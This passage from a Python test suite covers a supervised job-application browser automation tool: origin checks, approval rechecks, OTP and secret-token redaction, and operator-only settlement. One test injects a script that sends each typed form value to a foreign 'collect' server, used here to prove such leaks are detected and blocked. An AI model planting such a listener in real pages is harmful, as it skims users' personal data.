                await guard.navigate(opened, server.url("start"), goto)
            if scenario == "same-origin":
                assert opened.url == server.url("form") and not guard.refused
                assert await opened.locator("input").count() > 0
            else:
                assert guard.refused and opened.is_closed() and "/hop-6" not in server.requests
            assert not foreign.page_requests
    finally:
        foreign.close()


@pytest.mark.parametrize("mutation", ["variant", "rollback"])
async def test_production_rechecks_after_last_dom_read(mutation, production_pool, server, profile, tmp_path, fast, monkeypatch):
    from patchright.async_api import ElementHandle

    server.html["/race"] = (
        '<form method="post" action="/apply"><label for="tel">Téléphone</label><input id="tel" name="tel" type="tel" maxlength="10">'
        '<label for="dial">Indicatif de pays</label><select id="dial" name="dial" required><option value="">Choisir</option>'
        '<option value="be">Belgique (+32)</option><option value="fr">France (+33)</option>'
        '<option value="ch">Suisse (+41)</option></select><button>Envoyer ma candidature</button></form>'
        '<script>document.addEventListener("input", event => { if (event.target.id === "tel") '
        'navigator.sendBeacon("/variant-mutated", "synthetic"); });'
        'document.addEventListener("change", event => { if (event.target.id === "dial" && event.target.selectedIndex < 0) '
        'navigator.sendBeacon("/rollback-mutated", "synthetic"); });</script>'
    )
    _, app = approved_fixture(profile, tmp_path, server.url("race"))
    monkeypatch.setattr(service, "_candidate_facts", lambda *args: sample_facts())
    original = ElementHandle.evaluate
    revoked = []

    async def revoke(self, expression, *args, **kwargs):
        result = await original(self, expression, *args, **kwargs)
        hit = ("getAttribute('maxlength')" in expression if mutation == "variant" else "e.selectedOptions[0]" in expression)
        if hit and not revoked:
            with db.connect() as conn:
                conn.execute("UPDATE applications SET approved_rev=NULL WHERE id=?", (app.id,))
            revoked.append(True)
            return result if mutation == "variant" else "Changed after selection"
        return result

    monkeypatch.setattr(ElementHandle, "evaluate", revoke)

    def plan(snapshot):
        action = (act(snapshot, "Téléphone", "fill", "phone") if mutation == "variant" else
                  act(snapshot, "Indicatif", "select", "phone", "France (+33)"))
        return StepPlan(page_kind="form", actions=[action])

    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=production_pool,
                                           planner=ScriptedPlanner(plan)))
    await wait_for_supervised(app.id, task)
    await confirm_step(app.id)
    result = await asyncio.wait_for(task, timeout=12)
    assert revoked and not server.posts and not production_pool._contexts
    assert store.outstanding_attempt(app.id).id == result.id


@pytest.mark.parametrize("egress", ["write", "redirect"])
async def test_supervised_recipient_refusal_closes_and_holds(egress, page, server, profile, tmp_path, fast):
    foreign = FixtureServer()
    try:
        if egress == "redirect":
            server.redirects["/dry_egress"] = foreign.url("collect")
        _, app = approved_fixture(profile, tmp_path, server.url("dry_egress"))

        class ProbePlanner(ScriptedPlanner):
            async def plan(self, *args, **kwargs):
                await page.evaluate("""target => {
                    document.querySelector('input[name=first_name]').addEventListener('input', event => {
                        fetch(target, {method:'POST', body:event.target.value}).catch(() => {});
                    });
                }""", foreign.url("collect"))
                return await super().plan(*args, **kwargs)

        task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=FakePool(page),
                                               planner=ProbePlanner(form)))
        if egress == "write":
            await wait_for_supervised(app.id, task)
            await confirm_step(app.id)
        result = await asyncio.wait_for(task, timeout=12)
        assert page.is_closed() and store.outstanding_attempt(app.id).id == result.id
        assert "fenêtre fermée" in result.message and not foreign.page_requests and not foreign.posts
    finally:
        foreign.close()


@pytest.mark.parametrize("changed", ["approval", "pdf", "job"])
async def test_supervised_rechecks_after_live_scan(changed, page, server, profile, tmp_path, fast, monkeypatch):
    job, app = approved_fixture(profile, tmp_path, server.url("dry_egress"))
    original = engine._Run._live_decisions

    async def mutate_after_scan(self, *args, **kwargs):
        await original(self, *args, **kwargs)
        if changed == "pdf":
            cvs.safe_pdf(app).write_bytes(b"%PDF-1.4 changed")
        else:
            with db.connect() as conn:
                if changed == "approval":
                    conn.execute("UPDATE applications SET approved_rev=NULL WHERE id=?", (app.id,))
                else:
                    conn.execute("UPDATE jobs SET status='rejected' WHERE id=?", (job.id,))

    monkeypatch.setattr(engine._Run, "_live_decisions", mutate_after_scan)
    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=FakePool(page),
                                           planner=ScriptedPlanner(form)))
    await wait_for_supervised(app.id, task)
    await confirm_step(app.id)
    result = await asyncio.wait_for(task, timeout=12)
    assert page.is_closed() and store.outstanding_attempt(app.id).id == result.id
    assert not any(step.filled for step in result.result.steps) and not server.posts


@pytest.mark.parametrize("canonical", [False, True])
async def test_supervised_dedupe_canonical_or_legacy_pair_confirmation(canonical, server, profile, tmp_path):
    first_job, first = approved_fixture(profile, tmp_path, server.url("first"))
    second_job, second = approved_fixture(profile, tmp_path, server.url("second"),
                                         title="Poste distinct" if canonical else "Ingénieur système embarqué")
    if canonical:
        metadata = json.dumps({"origin_resolution": {"tenant": "fixture", "requisition_id": "REQ-7"}})
        with db.connect() as conn:
            conn.execute("UPDATE jobs SET extra=? WHERE id IN (?, ?)", (metadata, first_job.id, second_job.id))
    legacy = store.start_run(first.id, first.current_rev, "submit", "user", lambda rid: tmp_path / "legacy")
    store.reserve_send(legacy.id, profile_id=profile.id, application_id=first.id, trigger="user", role_key="", url_key="", daily_cap=9)
    store.finish_and_settle(legacy.id, RunResult(status="failed", message="Essai à vérifier."))
    pool = FakePool()
    unconfirmed = await service.run(second.id, mode="supervised", trigger="user", pool=pool,
                                    duplicate_confirmations=((first.id, second.id),))
    assert unconfirmed.status == "blocked" and not pool.opened
    await service.run(second.id, mode="supervised", trigger="user", pool=pool,
                      duplicate_confirmations=tuple(store.confirmation_tokens(profile.id, second.id).values()),
                      planner=ScriptedPlanner(form))
    assert bool(pool.opened) is not canonical
    assert not server.requests


@pytest.mark.parametrize("changed_side", ["first", "second"])
async def test_duplicate_confirmation_invalidated_inside_reservation(changed_side, production_pool, server, profile, tmp_path, monkeypatch):
    first_job, first = approved_fixture(profile, tmp_path, server.url("first"))
    second_job, second = approved_fixture(profile, tmp_path, server.url("second"), title="Ingénieur système embarqué")
    legacy = store.start_run(first.id, first.current_rev, "submit", "user", lambda rid: tmp_path / "legacy")
    store.reserve_send(legacy.id, profile_id=profile.id, application_id=first.id, trigger="user", role_key="", url_key="", daily_cap=9)
    store.finish_and_settle(legacy.id, RunResult(status="failed", message="Essai à vérifier."))
    token = store.confirmation_tokens(profile.id, second.id)[first.id]
    reserve = store.reserve_send

    def replace_posting(*args, **kwargs):
        with db.connect() as conn:
            conn.execute("UPDATE jobs SET description=? WHERE id=?", ("Fictional changed description",
                         (first_job if changed_side == "first" else second_job).id))
        return reserve(*args, **kwargs)

    monkeypatch.setattr(store, "reserve_send", replace_posting)
    result = await service.run(second.id, mode="supervised", trigger="user", pool=production_pool,
                               duplicate_confirmations=(token,), planner=ScriptedPlanner(form))
    assert result.status == "blocked" and "Doublon possible" in result.message
    assert not production_pool._contexts and not store.outstanding_attempt(second.id) and not server.requests


def test_origin_resolution_honors_canonical_ok():
    metadata = {"submit_ats": "workday", "tenant": "fixture", "requisition": "REQ-7", "canonical_ok": False}
    assert resolved_identity({"origin_resolution": metadata}) is None
    assert resolved_identity({"origin_resolution": {**metadata, "canonical_ok": True}}) == ("fixture", "req-7")


@pytest.mark.parametrize("prefix", ["Your verification code is", "Votre code de vérification est", "Ihr Bestätigungscode lautet",
                                    "Use the following code to sign in"])
@pytest.mark.parametrize("separator", [" ", ": ", "\u00a0:\u202f", " — "])
def test_credential_step_persists_only_diagnostics(server, profile, tmp_path, prefix, separator):
    phrase = prefix + separator + "654321"
    from jobhunt.apply.destination import clean_text
    assert "654321" not in clean_text(phrase)
    target = server.url("activate/fixture-secret") + "?token=fixture-token"
    _, app = approved_fixture(profile, tmp_path, target)
    run = store.start_run(app.id, app.current_rev, "dry_run", "user", lambda rid: tmp_path / "result")
    recorded = store.finish_run(run.id, RunResult(status="needs_email", message=phrase, final_url=target,
                                                 steps=[StepLog(index=1, url=target, page_kind="email_verification",
                                                                note=phrase, clicked=phrase, screenshot="/local/fixture.png")]))
    result = recorded.result
    assert result.final_url == result.steps[0].url == server.base
    assert result.steps[0].note == "credential_page" and not result.steps[0].clicked and not result.steps[0].screenshot
    assert "654321" not in result.model_dump_json() and "fixture-secret" not in result.model_dump_json()
    assert "credential_page" in store._safe_result(RunResult(status="failed", message=phrase)).message


async def test_secret_url_is_not_navigated_bound_or_persisted(server, profile, tmp_path, monkeypatch):
    monkeypatch.delenv("JOBHUNT_APPLY_LOCAL_SCREENSHOTS", raising=False)
    target = server.url("form") + "?gh_jid=42&token=fixture-secret#private"
    _, app = approved_fixture(profile, tmp_path, target)
    pool = FakePool()
    refused = await service.run(app.id, mode="supervised", trigger="user", pool=pool)
    assert refused.status == "blocked" and not pool.opened and not server.requests
    assert not store.active_reservations(profile.id)
    run = store.start_run(app.id, app.current_rev, "dry_run", "user", lambda rid: tmp_path / "result")
    recorded = store.finish_run(run.id, RunResult(status="needs_email", message="OTP: 654321",
                                                 steps=[StepLog(index=1, url=target, page_kind="email_verification",
                                                                screenshot="/local/fixture.png")]))
    assert recorded.result.steps[0].url == server.base + "?gh_jid=42"
    assert "654321" not in recorded.message and not recorded.result.steps[0].screenshot


async def test_dry_does_not_type_upload_or_click_even_on_a_page_with_background_sends(page, server, fast, cv_pdf, tmp_path):
    class ProbePlanner(ScriptedPlanner):
        async def plan(self, snapshot, facts, **kwargs):
            assert not snapshot.text and not snapshot.url and not kwargs["history"]
            assert all(fact.value is None and not fact.variants for fact in facts.facts)
            assert await page.evaluate("""async () => {
                try { await fetch('/collect?offline_probe=1'); return false; }
                catch { return true; }
            }""")
            return await super().plan(snapshot, facts, **kwargs)

    result = await run_application(page, url=server.url("dry_egress"), facts=sample_facts(),
                                   planner=ProbePlanner(form), verifier=FakeVerifier(), uploads=Uploads(cv_pdf=cv_pdf),
                                   mode="dry_run", out_dir=tmp_path / "shots")
    assert result.status == "blocked" and result.message == DRY_UNTESTED
    assert await page.input_value("input[name=first_name]") == ""
    assert await page.locator("input[type=file]").evaluate("el => el.files.length") == 0
    assert not result.steps[-1].filled and not result.steps[-1].clicked
    assert server.sent == []


async def test_dry_labels_value_dependent_fields_untested(page, server, cv_pdf, tmp_path):
    result = await run_application(page, url=server.url("dry_egress"), facts=sample_facts(),
                                   planner=ScriptedPlanner([StepPlan(page_kind="form")]), uploads=Uploads(cv_pdf=cv_pdf),
                                   mode="dry_run", out_dir=tmp_path / "shots")
    assert "Champs non testés : Prénom" in result.steps[0].note
    assert not server.sent


async def test_generic_live_engine_refuses_before_navigation_or_callbacks(page, server, cv_pdf, tmp_path):
    async def unexpected():
        raise AssertionError("unadapted live run must not reserve or dispatch")

    planner = ScriptedPlanner(form)
    result = await run_application(page, url=server.url("dry_egress"), facts=sample_facts(), planner=planner,
                                   uploads=Uploads(cv_pdf=cv_pdf), mode="submit", out_dir=tmp_path / "shots",
                                   before_submit=unexpected, on_nav_click=unexpected, on_submit_click=unexpected)
    assert result.status == "blocked" and result.message == UNSUPPORTED_DISPATCH
    assert not planner.calls and not server.requests and not result.submit_clicked


async def test_even_an_approved_live_service_run_opens_no_ats_session(profile, tmp_path):
    master = save_confirmed(profile.id)
    job = make_job(profile)
    app = make_app(profile, job, tmp_path, master_hash=master.content_hash)
    cvs.approve(app.id, app.current_rev)
    pool = FakePool()

    result = await service.run(app.id, mode="submit", trigger="user", pool=pool)

    assert result.status == "blocked" and service.SUPERVISED_ONLY in result.message
    assert not pool.opened and not store.active_reservations(profile.id)


@pytest.mark.parametrize("decision", [True, False])
async def test_supervised_holds_before_headful_browser_and_only_operator_settles(page, server, fast, profile, tmp_path, decision):
    master = save_confirmed(profile.id)
    job = make_job(profile, url=server.url("dry_egress"))
    app = make_app(profile, job, tmp_path, master_hash=master.content_hash)
    cvs.approve(app.id, app.current_rev)

    class Pool(FakePool):
        @asynccontextmanager
        async def page(self, profile_id, site, headless):
            reservations = store.active_reservations(profile_id)
            assert headless is False and len(reservations) == 1 and not server.requests
            with db.connect() as conn:
                import json
                binding = json.loads(conn.execute("SELECT binding_json FROM apply_reservations").fetchone()[0])
            assert binding["pdf_sha256"] == app.pdf_sha256 and binding["url"] == server.base
            assert binding["url_digest"] == store._url_key(job.origin_url)
            assert binding["rev"] == app.current_rev and binding["host"] == "127.0.0.1"
            yield page

    task = asyncio.create_task(service.run(app.id, mode="supervised", trigger="user", pool=Pool(),
                                           planner=ScriptedPlanner(form), verifier=FakeVerifier()))
    try:
        await page.locator("aside").wait_for(timeout=6000)
        assert not await page.input_value("input[name=first_name]")
        await confirm_step(app.id)
        assert await page.input_value("input[name=first_name]")
        assert await page.locator("input[type=file]").evaluate("el => el.files[0].name") == "CV.pdf"
        assert not server.posts_to("/apply")
        assert cvstore.get_application(app.id).status == "approved"
    finally:
        await page.close()
        result = await asyncio.wait_for(task, timeout=5)
    assert result.status == "failed" and not result.submit_clicked_at
    assert store.outstanding_attempt(app.id).id == result.id
    assert db.get_job(job.id).status != "applied"
    service.resolve_unconfirmed(app.id, sent=decision, run_id=result.id)
    assert cvstore.get_application(app.id).status == ("submitted" if decision else "draft")
    if not decision:
        assert store.requires_manual_retry(app.id) and not store.active_reservations(profile.id)


async def test_supervised_browser_start_crash_is_held_without_relaunch(profile, tmp_path):
    master = save_confirmed(profile.id)
    job = make_job(profile)
    app = make_app(profile, job, tmp_path, master_hash=master.content_hash)
    cvs.approve(app.id, app.current_rev)

    class CrashedPool(FakePool):
        @asynccontextmanager
        async def page(self, profile_id, site, headless):
            self.opened.append((profile_id, site, headless))
            assert store.active_reservations(profile_id)
            raise RuntimeError("fixture launch crashed")
            yield

    pool = CrashedPool()
    result = await service.run(app.id, mode="supervised", trigger="user", pool=pool, planner=ScriptedPlanner(form))
    assert result.status == "failed" and store.outstanding_attempt(app.id).id == result.id
    refused = await service.run(app.id, mode="supervised", trigger="user", pool=pool)
    assert refused.status == "blocked" and len(pool.opened) == 1


def test_unbacked_positive_status_does_not_automatically_settle(profile, tmp_path):
    master = save_confirmed(profile.id)
    job = make_job(profile)
    app = make_app(profile, job, tmp_path, master_hash=master.content_hash)
    cvs.approve(app.id, app.current_rev)
    run = store.start_run(app.id, app.current_rev, "submit", "user", lambda run_id: tmp_path / str(run_id))

    result = store.finish_and_settle(run.id, RunResult(status="submitted", message="Merci pour votre candidature"))

    assert result.status == "failed" and result.result.submit_clicked
    assert store.outstanding_attempt(app.id).id == run.id
    assert cvstore.get_application(app.id).status == "failed"
    assert db.get_job(job.id).status != "applied"
